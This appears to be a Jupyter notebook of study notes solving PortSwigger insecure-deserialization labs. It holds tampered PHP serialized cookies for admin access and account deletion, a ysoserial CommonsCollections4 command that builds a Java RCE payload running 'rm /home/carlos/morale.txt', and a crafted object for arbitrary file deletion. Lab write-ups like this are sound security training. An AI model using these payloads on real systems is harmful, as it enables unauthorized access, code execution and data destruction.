{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--------------------------------------------------------------------------------------------\n",
    "                           # Java Insecure Deserialization:                                 \n",
    "                           # PHP Insecure Deserialization:                                  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Resources:\n",
    "\n",
    "# Labs:\n",
    "  - https://portswigger.net/web-security/deserialization\n",
    "  \n",
    "# Arab Hack Sploit:\n",
    "  - https://www.youtube.com/watch?v=C0MholDeiE0&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=19"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    ">> What is serialization?\n",
    "   - Serialization is the process of converting complex data structures, such as objects and their fields, into a \"flatter\" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:\n",
    "     - Write complex data to inter-process memory, a file, or a database\n",
    "     - Send complex data, for example, over a network, between different components of an application, or in an API call"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1: Modifying serialized objects:\n",
    "\n",
    "log with (wiener:peter)\n",
    "intercept the request of (GET /my-account)\n",
    "with Burb inspector highlight the cookie and see its params\n",
    "change (\"admin\";b:0;) to (\"amdin\";b:1;)\n",
    "change the request to (GET /admin/delete?username=carlos)\n",
    "send the request to solve the lab"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: Modifying serialized data types:\n",
    "\n",
    "log with (wiener:peter)\n",
    "intercept the request of (GET /my-account)\n",
    "with Burb inspector highlight the cookie and see its params\n",
    "change length of the username to (s:13) and change it to (\"administrator\")\n",
    "change the access_token to integer (i:0)\n",
    "the cookie will be:\n",
    "( {O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;} )\n",
    "change the request to (GET /admin/delete?username=carlos)\n",
    "send the request to solve the lab"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: Exploiting Java deserialization with Apache Commons:\n",
    "\n",
    "log with (wiener:peter)\n",
    "then intercept the request of (GET /my-account)\n",
    "take the cookie and URL decoding it \n",
    "It's a java deserialization cookie\n",
    "use (ysoserial Tool) to solve the lab by the next code\n",
    "The Lab code to use (ysoserial Tool) is\n",
    "(java \\\n",
    " --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\\\n",
    " --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\\\n",
    " --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\\\n",
    " -jar ~/Downloads/Hacking_Tools/ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d '\\n') then URL encoding for the output\n",
    "\n",
    "Replace the cookie with the Encoded one"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: Using application functionality to exploit insecure deserialization:\n",
    "\n",
    "Log with (wiener:peter)\n",
    "intercept the request of deleting the account\n",
    "change the cookie with Burb inspector to (s:23;\"/home/carlos/morale.txt\";)\n",
    "then send the request"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-5: Arbitrary object injection in PHP\n",
    "\n",
    "log with (wiener:peter)\n",
    "intercept the request of (GET /my-account)\n",
    "change the cookie with Burb inspector to (s:8:\"username\";s:6:\"carlos\") then send it\n",
    "look for the response and copy the \"carlos\" access_token \n",
    "change the access_token with Burb inspector then send the request to see 200 OK\n",
    "scroll down to see the details of the page\n",
    "on Burbsuite Target tab look for the Lab URL then \"Libs\" folder\n",
    "you'll see \"CustomTemplate.php\" request > send it to the repeater\n",
    "and add ~ to the request (GET /libs/CustomTemplate.php~)\n",
    "you'll see the Page source code > look for deleting function\n",
    "you'll see the destruct function that deletes the files\n",
    "we need to construct a serialized cookie to delete the file\n",
    "hightlight the cookie and with Burb inspector change the cookie to\n",
    " (O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";})\n",
    "send the request to solve the lab"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
